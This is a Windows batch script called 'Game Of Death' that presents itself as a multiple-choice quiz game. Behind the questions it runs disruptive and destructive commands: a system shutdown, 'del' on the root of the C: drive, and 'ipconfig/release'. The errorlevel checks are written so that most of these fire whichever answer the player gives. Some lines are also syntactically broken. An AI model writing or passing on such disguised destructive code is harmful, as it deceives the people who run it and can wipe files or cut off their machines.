@echo off
title Game Of Death Version 1
set creator=Created by Spider Anongreyhat
color a
cls
ipconfig
echo {A}Rice
echo {B}Beans
choice /c AB /m “What's your best food?"
if errorlevel 1 echo %Random% %Random%  %Random%
if errorlevel 2 start notepad
echo {A}Wicked
echo {B}Nice
choice /c AB /m "What do u think about hackers"
if errorlevel 1 shutdown
if errorlevel 2 echo You Won!Next level
choice /c YN /m "Do you wanna exit these game?"
if errorlevel 1 del C:\
if errorlevel 2 echo Congratulations..No going back
pause
echo A:Mark Zuckerberg
echo B:Bill gates
choice /c AB /m "Who created Facebook?"
if errorlevel 1 ipconfig
if errorlevel 2 ipconfig/release
echo A:Follow me
echo B:Skip
choice /c AB /m "follow me on GitHub or skip"
if errorlevel 1 echo https://github.com/spider863644
if errorlevel 2 set /p ip=Enter Your PC ip address:
ping %ip%
if errorlevel grt 0 (echo Hahaha You better change ur pc ip address) else(echo Nah God save you!)
choice /c YN /m "Do you love this game?"
if errorlevel 1 goto :exit
if errorlevel 2 del C:/
::The end game
:exit 
echo You are free to exit..Thanks for playing
pause
exit /b 0
pause
exit